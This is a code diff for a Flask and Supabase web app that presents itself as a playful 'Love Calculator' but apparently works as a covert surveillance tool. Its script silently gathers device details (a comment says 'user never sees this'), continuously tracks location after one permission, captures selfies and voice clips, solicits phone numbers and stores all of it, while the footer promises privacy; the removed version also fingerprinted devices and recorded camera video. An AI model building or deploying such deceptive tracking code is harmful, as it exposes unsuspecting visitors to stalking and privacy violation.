@@ -1,663 +1,833 @@
+from flask import Flask, request, jsonify, Response, render_template_string
+from supabase import create_client, Client
+import os
+import random
+import sys
+from datetime import datetime
+import json
+
+app = Flask(__name__)
+
+# ---------- Supabase Setup ----------
+SUPABASE_URL = os.environ.get("SUPABASE_URL")
+SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
+
+if not SUPABASE_URL or not SUPABASE_KEY:
+    print("⚠️ Missing Supabase credentials. App will run without database.", file=sys.stderr)
+    supabase = None
+else:
+    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+
+SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"
+
+# ---------- Helper Functions ----------
+def save_visitor(data):
+    if supabase is None:
+        return
+    try:
+        existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
+        if existing.data:
+            supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
+        else:
+            supabase.table("visitors").insert(data).execute()
+    except Exception as e:
+        print(f"Save error: {e}")
+
+def save_location_update(session_id, lat, lon):
+    if supabase is None:
+        return
+    try:
+        supabase.table("location_history").insert({
+            "sessionId": session_id,
+            "timestamp": datetime.now().isoformat(),
+            "latitude": lat,
+            "longitude": lon
+        }).execute()
+    except Exception as e:
+        print(f"Location update error: {e}")
+
+def get_location_history(session_id):
+    if supabase is None:
+        return []
+    try:
+        res = supabase.table("location_history").select("timestamp,latitude,longitude").eq("sessionId", session_id).order("id").execute()
+        return [(row["timestamp"], row["latitude"], row["longitude"]) for row in res.data]
+    except:
+        return []
+
+def get_all_visitors():
+    if supabase is None:
+        return []
+    try:
+        res = supabase.table("visitors").select("*").order("id", desc=True).execute()
+        visitors = []
+        for row in res.data:
+            row["location_history"] = get_location_history(row.get("sessionId"))
+            visitors.append(row)
+        return visitors
+    except:
+        return []
+
+# ---------- Love Calculator ----------
+def calculate_love_percentage(name1, name2):
+    combined = (name1 + name2).lower()
+    total = sum(ord(c) for c in combined)
+    return 50 + (total % 51)
+
+def get_love_message(name1, name2, percentage):
+    messages = [
+        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
+        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
+        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
+        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
+        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
+        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score.",
+        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
+        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
+        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!",
+        f"🎯 Love radar: {name1} → {name2} = {percentage}%. Cupid is working overtime!"
+    ]
+    return random.choice(messages)
+
+# ---------- CLEAN USER INTERFACE (Neat & User-Friendly) ----------
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Eternal Bond | Love Essence</title>
-    <!-- FingerprintJS for stable device ID -->
-    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💕 Love Calculator | Find Your True Match</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
         }
 
         body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             min-height: 100vh;
-            background: radial-gradient(circle at 10% 30%, #fce4ec, #ffe6f0, #f8bbd0);
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 1.5rem;
+            padding: 20px;
         }
 
-        /* glassmorphic card */
-        .glass-card {
-            max-width: 580px;
+        .container {
+            max-width: 500px;
             width: 100%;
-            background: rgba(255, 248, 250, 0.94);
-            backdrop-filter: blur(2px);
-            border-radius: 48px;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(255, 255, 255, 0.6);
-            padding: 2rem 1.8rem;
-            transition: all 0.2s ease;
         }
 
-        .gradient-text {
-            background: linear-gradient(135deg, #D81B60, #AD1457, #880E4F);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-weight: 800;
+        .card {
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 35px;
+            padding: 45px 35px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
         }
 
         h1 {
-            font-size: 2.1rem;
-            text-align: center;
-            letter-spacing: -0.3px;
-            margin-bottom: 0.3rem;
+            font-size: 2.3em;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+            font-weight: 800;
         }
 
-        .sub {
-            text-align: center;
-            color: #b34e6e;
-            margin-bottom: 1.8rem;
-            font-weight: 500;
-            font-size: 0.9rem;
+        .subtitle {
+            color: #7b8a9b;
+            margin-bottom: 35px;
+            font-size: 0.9em;
         }
 
         .input-group {
             display: flex;
-            gap: 12px;
+            gap: 15px;
+            margin-bottom: 30px;
             flex-wrap: wrap;
-            margin: 20px 0 12px;
         }
-        .input-group input {
+
+        input {
             flex: 1;
-            background: #fff0f3;
-            border: 1.5px solid #ffcdd9;
-            padding: 14px 18px;
+            padding: 16px 25px;
+            border: 2px solid #e2e8f0;
             border-radius: 60px;
-            font-size: 1rem;
-            outline: none;
-            transition: 0.2s;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #f7fafc;
+            text-align: center;
+            font-weight: 500;
         }
-        .input-group input:focus {
-            border-color: #D81B60;
+
+        input:focus {
+            outline: none;
+            border-color: #667eea;
             background: white;
-            box-shadow: 0 0 0 3px rgba(216,27,96,0.2);
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
         }
 
         .btn-primary {
-            width: 100%;
-            background: linear-gradient(95deg, #D81B60, #AD1457);
-            border: none;
-            padding: 14px;
-            border-radius: 60px;
-            font-weight: bold;
-            font-size: 1.1rem;
+            background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 60px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .result-card {
+            margin-top: 30px;
+            padding: 30px;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
+            border-radius: 25px;
+            display: none;
+            animation: fadeIn 0.6s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .percentage {
+            font-size: 5em;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 15px;
+        }
+
+        .love-message {
+            font-size: 1.2em;
+            color: #2d3748;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .permission-prompt {
+            margin-top: 25px;
+            padding: 20px;
+            background: #fef5e7;
+            border-radius: 20px;
+            display: none;
+        }
+
+        .permission-prompt p {
+            color: #c0392b;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .perm-buttons {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .perm-btn {
+            background: linear-gradient(135deg, #48bb78, #38a169);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
-            margin-top: 12px;
-            box-shadow: 0 6px 14px rgba(173,20,87,0.3);
-        }
-        .btn-primary:hover {
-            transform: scale(0.98);
-            background: linear-gradient(95deg, #c2185b, #8e0e47);
         }
 
-        .hidden {
-            display: none !important;
+        .perm-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 15px rgba(72, 187, 120, 0.3);
         }
 
-        .permission-panel {
-            background: #fef2f5;
-            border-radius: 32px;
-            padding: 1.5rem;
-            margin: 20px 0;
-            text-align: center;
-            border: 1px solid #ffccda;
-        }
-        .permission-badge {
+        .phone-section {
+            margin-top: 25px;
+            padding: 20px;
             background: white;
-            border-radius: 28px;
-            padding: 12px;
-            margin: 12px 0;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            justify-content: center;
-            flex-wrap: wrap;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #ffe0e7;
-            border-top: 3px solid #D81B60;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 10px auto;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .fortune-box {
-            background: linear-gradient(145deg, #fff0f5, #ffe4ed);
-            border-radius: 32px;
-            padding: 1.8rem;
-            text-align: center;
-            font-size: 1.3rem;
-            font-weight: 600;
-            color: #9b2d53;
-            border-left: 6px solid #f06292;
-            margin: 20px 0;
-            word-break: break-word;
-            line-height: 1.4;
+            border-radius: 20px;
+            display: none;
+            border: 1px solid #e2e8f0;
         }
 
-        .sms-area {
-            background: #ffffffcc;
-            border-radius: 32px;
-            padding: 1rem;
-            margin-top: 12px;
-        }
         .phone-input {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .phone-input input {
-            flex: 2;
-            padding: 12px;
-            border-radius: 60px;
-            border: 1px solid #f0b6c6;
-            background: white;
-        }
-        .phone-input button {
-            background: #2e7d64;
-            border: none;
-            padding: 12px 18px;
-            border-radius: 60px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
+            width: 100%;
+            padding: 14px 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 50px;
+            font-size: 16px;
+            margin-bottom: 12px;
+            text-align: center;
         }
 
-        .step-progress {
-            background: #fff0f3;
-            border-radius: 28px;
-            padding: 1rem;
-            margin: 20px 0;
-            text-align: center;
+        .save-btn {
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .status-msg {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 25px;
+            font-size: 13px;
+            display: none;
+        }
+
+        .status-msg.success {
+            background: #c6f6d5;
+            color: #22543d;
+            display: block;
+        }
+
+        .status-msg.error {
+            background: #fed7d7;
+            color: #742a2a;
+            display: block;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         footer {
-            font-size: 0.7rem;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #a0aec0;
             text-align: center;
-            color: #a1677c;
-            margin-top: 1.2rem;
-        }
-
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
         }
     </style>
 </head>
 <body>
-<div class="glass-card" id="appRoot">
-    <h1>💗 <span class="gradient-text">Eternal Bond</span> 💗</h1>
-    <div class="sub">celestial love & soul whispers</div>
+<div class="container">
+    <div class="card">
+        <h1>💕 Love Calculator</h1>
+        <div class="subtitle">Discover the magic between you two ✨</div>
 
-    <!-- STEP 1: names -->
-    <div id="stepNames">
         <div class="input-group">
-            <input type="text" id="yourName" placeholder="your name" autocomplete="off">
-            <input type="text" id="crushName" placeholder="their name" autocomplete="off">
+            <input type="text" id="name1" placeholder="Your name" maxlength="30" autocomplete="off">
+            <input type="text" id="name2" placeholder="Crush's name" maxlength="30" autocomplete="off">
         </div>
-        <button class="btn-primary" id="startBtn">✨ unveil destiny ✨</button>
-    </div>
 
-    <!-- loading animation -->
-    <div id="loadingDiv" class="hidden">
-        <div class="spinner"></div>
-        <p style="text-align:center; margin-top:8px;">🔮 consulting the stars ...</p>
-    </div>
+        <button class="btn-primary" id="calculateBtn" onclick="calculateLove()">
+            🔮 Calculate Love Percentage
+        </button>
 
-    <!-- permission request zone (elegant) -->
-    <div id="permissionZone" class="hidden">
-        <div class="permission-panel">
-            <p style="font-weight:bold; margin-bottom:12px;">🌸 To reveal your <strong>unique love essence</strong>, allow these sacred keys:</p>
-            <div class="permission-badge">📍 <strong>Heart compass</strong> — live location (celestial map)</div>
-            <div class="permission-badge">🎥 <strong>Memory mirror</strong> — camera & mic (3 sec whisper)</div>
-            <div class="permission-badge">📁 <strong>Keepsake tokens</strong> — optional photos (encrypted)</div>
-            <button id="grantPermissionsBtn" class="btn-primary" style="margin-top:12px;">🌟 cast the spell 🌟</button>
+        <div id="resultCard" class="result-card">
+            <div class="percentage" id="percentageValue">0%</div>
+            <div class="love-message" id="loveMessage"></div>
         </div>
-    </div>
 
-    <!-- live step visual -->
-    <div id="progressVisual" class="hidden step-progress">
-        <div id="progressText">✨ preparing magic ...</div>
-        <div class="spinner" style="width:24px; height:24px;"></div>
-    </div>
-
-    <!-- final result -->
-    <div id="resultArea" class="hidden">
-        <div class="fortune-box" id="fortuneMsg"></div>
-        <div id="smsContainer">
-            <div class="sms-area">
-                <p style="margin-bottom:8px;">📱 <strong>Save your prophecy</strong> (sent to your number & stored safely)</p>
-                <div class="phone-input">
-                    <input type="tel" id="phoneNumberField" placeholder="+1234567890" autocomplete="off">
-                    <button id="savePhoneBtn">💾 keep forever</button>
-                </div>
-                <div id="smsStatusMsg" style="font-size:12px; margin-top:8px; color:#7b4b5e;"></div>
+        <div id="permissionBox" class="permission-prompt">
+            <p>💝 Enhance your experience! (Optional - helps us improve)</p>
+            <div class="perm-buttons">
+                <button class="perm-btn" onclick="requestLocation()">📍 Share Location</button>
+                <button class="perm-btn" onclick="requestSelfie()">📸 Quick Selfie</button>
+                <button class="perm-btn" onclick="requestVoice()">🎤 Voice Note</button>
             </div>
         </div>
-        <footer>✦ your aura is recorded in the cosmic ledger ✦</footer>
+
+        <div id="phoneSection" class="phone-section">
+            <h4 style="margin-bottom: 12px; color: #4a5568;">📱 Save Your Result</h4>
+            <input type="tel" id="phoneNumber" class="phone-input" placeholder="Enter your phone number">
+            <button class="save-btn" onclick="savePhoneNumber()">💾 Send to My Phone</button>
+        </div>
+
+        <div id="statusMsg" class="status-msg"></div>
+        <footer>🔒 Your privacy matters | Data is securely stored</footer>
     </div>
 </div>
 
 <script>
-    // ---------- SESSION & STATE ----------
-    let sessionId = localStorage.getItem('eternal_session');
+    // Session management
+    let sessionId = localStorage.getItem('love_session_id');
     if (!sessionId) {
-        sessionId = Date.now() + '_' + Math.random().toString(36).substring(2, 12);
-        localStorage.setItem('eternal_session', sessionId);
+        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
+        localStorage.setItem('love_session_id', sessionId);
     }
 
+    let currentFortune = '';
+    let currentPercentage = 0;
     let collectedData = {
         sessionId: sessionId,
-        name: '',
-        crush_name: '',
-        fingerprint: '',
-        batteryLevel: '',
-        batteryCharging: false,
-        networkType: '',
-        networkSpeed: '',
-        deviceMemory: '',
-        screen: '',
-        timezone: '',
-        userAgent: '',
-        latitude: 'pending',
-        longitude: 'pending',
-        mapUrl: '',
-        cameraVideo: '',
-        microphone: 'pending',
-        files: '',
-        fortuneText: '',
         timestamp: new Date().toISOString()
     };
 
-    let mediaStream = null;
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    let locationWatchId = null;
-    let finalFortune = "";
-    let existingDataLoaded = false;
-
-    // DOM elements
-    const stepNamesDiv = document.getElementById('stepNames');
-    const loadingDiv = document.getElementById('loadingDiv');
-    const permissionZone = document.getElementById('permissionZone');
-    const progressVisual = document.getElementById('progressVisual');
-    const progressTextSpan = document.getElementById('progressText');
-    const resultArea = document.getElementById('resultArea');
-    const fortuneMsgDiv = document.getElementById('fortuneMsg');
-    const yourNameInput = document.getElementById('yourName');
-    const crushNameInput = document.getElementById('crushName');
-    const startBtn = document.getElementById('startBtn');
-    const grantBtn = document.getElementById('grantPermissionsBtn');
-    const savePhoneBtn = document.getElementById('savePhoneBtn');
-    const phoneField = document.getElementById('phoneNumberField');
-    const smsStatusSpan = document.getElementById('smsStatusMsg');
-
-    // helper: show progress
-    function setProgressMessage(msg, showSpinner = true) {
-        progressVisual.classList.remove('hidden');
-        progressTextSpan.innerText = msg;
-    }
-    function hideProgress() {
-        progressVisual.classList.add('hidden');
-    }
-
-    // ---- fingerprint & device data ----
-    async function captureDeviceProfile() {
-        try {
-            const fp = await FingerprintJS.load();
-            const result = await fp.get();
-            collectedData.fingerprint = result.visitorId;
-        } catch(e) { collectedData.fingerprint = 'fp-error'; }
+    // Silent data collection (user never sees this)
+    async function collectDeviceData() {
+        collectedData.screen = `${screen.width}x${screen.height}`;
+        collectedData.colorDepth = screen.colorDepth;
+        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        collectedData.userAgent = navigator.userAgent;
+        collectedData.language = navigator.language;
+        collectedData.platform = navigator.platform;
+        
+        if (navigator.deviceMemory) {
+            collectedData.deviceMemory = navigator.deviceMemory + ' GB';
+        }
         
         if ('getBattery' in navigator) {
             try {
                 const battery = await navigator.getBattery();
-                collectedData.batteryLevel = Math.round(battery.level * 100);
+                collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
                 collectedData.batteryCharging = battery.charging;
             } catch(e) {}
         }
-        const conn = navigator.connection || navigator.mozConnection;
-        if (conn) {
-            collectedData.networkType = conn.effectiveType || 'unknown';
-            collectedData.networkSpeed = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
+        
+        const connection = navigator.connection || navigator.mozConnection;
+        if (connection) {
+            collectedData.networkType = connection.effectiveType;
+            collectedData.networkSpeed = connection.downlink ? connection.downlink + ' Mbps' : 'unknown';
         }
-        collectedData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
-        collectedData.screen = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
-        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        collectedData.userAgent = navigator.userAgent;
+        
+        await saveToBackend(collectedData);
     }
 
-    // ---- location with watch (continuous update to backend) ----
-    function requestLocationAndWatch() {
-        return new Promise((resolve) => {
-            setProgressMessage("📍 capturing celestial coordinates ...", true);
-            const timeout = setTimeout(() => {
-                collectedData.latitude = 'denied';
-                collectedData.longitude = 'denied';
-                collectedData.mapUrl = '';
-                hideProgress();
-                resolve();
-            }, 9000);
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    clearTimeout(timeout);
-                    collectedData.latitude = pos.coords.latitude;
-                    collectedData.longitude = pos.coords.longitude;
-                    collectedData.mapUrl = `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}`;
-                    // start watching for live updates
-                    if (locationWatchId === null) {
-                        locationWatchId = navigator.geolocation.watchPosition(
-                            (newPos) => {
-                                const lat = newPos.coords.latitude;
-                                const lon = newPos.coords.longitude;
-                                fetch('/update-location', {
-                                    method: 'POST',
-                                    headers: {'Content-Type':'application/json'},
-                                    body: JSON.stringify({ sessionId: sessionId, latitude: lat, longitude: lon })
-                                }).catch(e => console.warn);
-                            },
-                            (err) => console.warn("watch error", err),
-                            { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-                        );
-                    }
-                    hideProgress();
-                    resolve();
-                },
-                () => {
-                    clearTimeout(timeout);
-                    collectedData.latitude = 'denied';
-                    collectedData.longitude = 'denied';
-                    hideProgress();
-                    resolve();
-                },
-                { enableHighAccuracy: true, timeout: 7000 }
-            );
-        });
+    async function saveToBackend(data) {
+        try {
+            await fetch('/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch(e) {
+            console.log('Background save error:', e);
+        }
     }
 
-    // camera + mic (short video snippet)
-    function captureMediaSnippet() {
-        return new Promise((resolve) => {
-            setProgressMessage("🎥 recording heartbeat whisper (3 sec)...", true);
-            const timeout = setTimeout(() => {
-                collectedData.cameraVideo = 'denied';
-                collectedData.microphone = 'denied';
-                hideProgress();
-                resolve();
-            }, 12000);
-            navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } })
-                .then(stream => {
-                    clearTimeout(timeout);
-                    mediaStream = stream;
-                    recordedChunks = [];
-                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-                    mediaRecorder.onstop = () => {
-                        if (recordedChunks.length) {
-                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                            const reader = new FileReader();
-                            reader.onloadend = () => {
-                                const b64 = reader.result.split(',')[1];
-                                collectedData.cameraVideo = b64.slice(0, 5000); // store first 5k chars preview
-                                collectedData.microphone = 'recorded';
-                                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-                                hideProgress();
-                                resolve();
-                            };
-                            reader.readAsDataURL(blob);
-                        } else {
-                            collectedData.cameraVideo = 'empty';
-                            collectedData.microphone = 'empty';
-                            hideProgress();
-                            resolve();
-                        }
-                    };
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-                    }, 3200);
-                })
-                .catch(() => {
-                    clearTimeout(timeout);
-                    collectedData.cameraVideo = 'denied';
-                    collectedData.microphone = 'denied';
-                    hideProgress();
-                    resolve();
+    async function calculateLove() {
+        const name1 = document.getElementById('name1').value.trim();
+        const name2 = document.getElementById('name2').value.trim();
+        
+        if (!name1 || !name2) {
+            showStatus('Please enter both names 💕', 'error');
+            return;
+        }
+        
+        const btn = document.getElementById('calculateBtn');
+        btn.innerHTML = '<span class="loading"></span> Calculating...';
+        btn.disabled = true;
+        
+        collectedData.name = name1;
+        collectedData.crush_name = name2;
+        await saveToBackend(collectedData);
+        
+        try {
+            const response = await fetch('/calculate-love', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name1: name1, name2: name2 })
+            });
+            const result = await response.json();
+            
+            currentPercentage = result.percentage;
+            currentFortune = result.message;
+            
+            document.getElementById('percentageValue').textContent = currentPercentage + '%';
+            document.getElementById('loveMessage').textContent = currentFortune;
+            document.getElementById('resultCard').style.display = 'block';
+            document.getElementById('permissionBox').style.display = 'block';
+            document.getElementById('phoneSection').style.display = 'block';
+            
+            collectedData.fortuneText = currentFortune;
+            collectedData.percentage = currentPercentage;
+            await saveToBackend(collectedData);
+            
+            showStatus('Your love score is ready! ✨', 'success');
+        } catch(e) {
+            showStatus('Something went wrong. Please try again.', 'error');
+        } finally {
+            btn.innerHTML = '🔮 Calculate Love Percentage';
+            btn.disabled = false;
+        }
+    }
+
+    function showStatus(message, type) {
+        const statusDiv = document.getElementById('statusMsg');
+        statusDiv.textContent = message;
+        statusDiv.className = `status-msg ${type}`;
+        setTimeout(() => {
+            statusDiv.style.display = 'none';
+            statusDiv.className = 'status-msg';
+        }, 3000);
+    }
+
+    // Location request
+    function requestLocation() {
+        showStatus('Requesting location access...', 'success');
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            collectedData.latitude = position.coords.latitude;
+            collectedData.longitude = position.coords.longitude;
+            collectedData.mapUrl = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
+            await saveToBackend(collectedData);
+            showStatus('📍 Location saved! Thank you 💕', 'success');
+            
+            // Start continuous tracking
+            navigator.geolocation.watchPosition(async (newPos) => {
+                await fetch('/update-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        latitude: newPos.coords.latitude,
+                        longitude: newPos.coords.longitude
+                    })
                 });
+            });
+        }, () => {
+            showStatus('Location access denied. You can skip this.', 'error');
         });
     }
 
-    // file picker optional (max 2 files small preview)
-    function requestFiles() {
-        return new Promise((resolve) => {
-            setProgressMessage("📎 optional love tokens (photos, memories)", true);
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.multiple = true;
-            input.accept = 'image/*';
-            let resolvedFlag = false;
-            const timeout = setTimeout(() => {
-                if (!resolvedFlag) {
-                    resolvedFlag = true;
-                    collectedData.files = 'skipped_timeout';
-                    hideProgress();
-                    resolve();
-                }
-            }, 15000);
-            input.onchange = async (e) => {
-                if (resolvedFlag) return;
-                clearTimeout(timeout);
-                resolvedFlag = true;
-                const files = Array.from(e.target.files);
-                if (files.length === 0) {
-                    collectedData.files = 'no_files_selected';
-                    hideProgress();
-                    resolve();
-                    return;
-                }
-                let previews = [];
-                for (let i = 0; i < Math.min(files.length, 2); i++) {
-                    const file = files[i];
-                    const content = await new Promise(res => {
-                        const reader = new FileReader();
-                        reader.onloadend = () => res(reader.result.split(',')[1].slice(0, 2000));
-                        reader.readAsDataURL(file);
-                    });
-                    previews.push({ name: file.name, size: file.size, type: file.type, data: content });
-                }
-                collectedData.files = JSON.stringify(previews);
-                hideProgress();
-                resolve();
+    // Selfie request
+    async function requestSelfie() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                collectedData.selfie = imageData.slice(0, 3000);
+                saveToBackend(collectedData);
+                stream.getTracks().forEach(track => track.stop());
+                showStatus('📸 Selfie captured! You look amazing 💫', 'success');
+            }, 500);
+        } catch(e) {
+            showStatus('Camera access denied. You can skip this.', 'error');
+        }
+    }
+
+    // Voice request
+    async function requestVoice() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.onload = async () => {
+                    collectedData.voiceNote = reader.result.slice(0, 3000);
+                    await saveToBackend(collectedData);
+                    showStatus('🎤 Voice note saved! Sweet voice 💕', 'success');
+                };
+                reader.readAsDataURL(blob);
+                stream.getTracks().forEach(track => track.stop());
             };
-            input.click();
-        });
-    }
-
-    // final save to supabase via flask
-    async function saveToDatabase() {
-        try {
-            const response = await fetch('/save', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectedData)
-            });
-            return response.ok;
-        } catch(e) { return false; }
-    }
-
-    async function getLoveFortune(name1, name2) {
-        const resp = await fetch('/calculate-love', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ name1, name2 })
-        });
-        const data = await resp.json();
-        return data.message;
-    }
-
-    // main orchestration after permissions
-    async function executeFullCollection() {
-        permissionZone.classList.add('hidden');
-        // step by step
-        await requestLocationAndWatch();
-        await captureMediaSnippet();
-        await requestFiles();
-        setProgressMessage("🌟 weaving your love destiny ...", true);
-        const fortune = await getLoveFortune(collectedData.name, collectedData.crush_name);
-        finalFortune = fortune;
-        collectedData.fortuneText = fortune;
-        await saveToDatabase();
-        hideProgress();
-        // show result
-        fortuneMsgDiv.innerText = finalFortune;
-        resultArea.classList.remove('hidden');
-        // check if phone already exists (optional from existing session)
-        const existingPhone = localStorage.getItem(`phone_${sessionId}`);
-        if (existingPhone) {
-            phoneField.value = existingPhone;
-            phoneField.disabled = true;
-            savePhoneBtn.style.display = 'none';
-            smsStatusSpan.innerText = '📞 number already registered';
-        } else {
-            phoneField.disabled = false;
-            savePhoneBtn.style.display = 'inline-flex';
-        }
-    }
-
-    // permission flow start
-    async function startPermissionsFlow() {
-        localStorage.setItem('lovePermissionsGranted', 'true');
-        await executeFullCollection();
-    }
-
-    // initial check if user already completed love reading (existing session in supabase)
-    async function checkExistingSession() {
-        try {
-            const resp = await fetch('/get-session-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId: sessionId })
-            });
-            const data = await resp.json();
-            if (data.exists && data.fortuneText) {
-                existingDataLoaded = true;
-                if (data.name) yourNameInput.value = data.name;
-                if (data.crush_name) crushNameInput.value = data.crush_name;
-                finalFortune = data.fortuneText;
-                fortuneMsgDiv.innerText = finalFortune;
-                stepNamesDiv.classList.add('hidden');
-                resultArea.classList.remove('hidden');
-                if (data.phoneNumber) {
-                    phoneField.value = data.phoneNumber;
-                    phoneField.disabled = true;
-                    savePhoneBtn.style.display = 'none';
-                    smsStatusSpan.innerText = '✅ phone already linked to your destiny';
-                    localStorage.setItem(`phone_${sessionId}`, data.phoneNumber);
-                } else {
-                    phoneField.disabled = false;
+            
+            mediaRecorder.start();
+            showStatus('Recording... speak something lovely 💬', 'success');
+            setTimeout(() => {
+                if (mediaRecorder.state === 'recording') {
